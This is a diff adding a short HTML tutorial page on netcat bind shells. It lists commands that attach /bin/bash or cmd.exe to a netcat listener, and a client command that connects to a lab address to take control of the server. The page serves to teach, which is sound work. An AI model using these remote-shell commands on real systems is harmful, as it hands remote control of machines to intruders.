@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>netcat bind</title>
+</head><body>netcat bind and reverse shell<br/>
+<br/>
+Bind shell<br/>
+Binding will reserve the port number to a particular network service which is going to listen for connections over that port. <br/>
+<br/>
+To setup bind shell with Netcat, we will do the following actions on the server:<br/>
+&nbsp;<ul><li>&nbsp;Instruct Netcat to listen on a certain port number, e.g., 12345.</li>
+<li>Attach either <span style="font-family: courier new">/bin/bash</span>&nbsp;or <span style="font-family: courier new">%WINDIR%\System32\cmd.exe</span>&nbsp;to Netcat.</li>
+</ul>
+<br/>
+And these actions are implemented together with a simple command:<br/>
+&nbsp;<br/>
+<span style="font-family: courier new"><span style="font-family: georgia"><b><i>UNIX/Linux: </i></b></span># netcat -v -l -p 12345 -e /bin/bash</span><br/>
+<b><i>Windows: </i></b><span style="font-family: courier new">&gt; nc –v –l –p 12345 –e cmd.exe</span><br/>
+&nbsp;<br/>
+Finally, on our client machine, we will issue the following command to connect to the server and eventually control it – assuming the server’s IP address is 192.168.56.1:<br/>
+&nbsp;<br/>
+<span style="font-family: courier new">netcat 192.168.56.1 12345</span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<div style="text-align: center"><a href="https://www.semurity.com/wp-content/uploads/2017/07/Blog02_img02.png"><img src="https://www.semurity.com/wp-content/uploads/2017/07/Blog02_img02.png" width="514" height="160" /></a><br/>
+</div><img src="https://www.semurity.com/wp-content/uploads/2017/07/Blog02_img02.png" /></body></html>
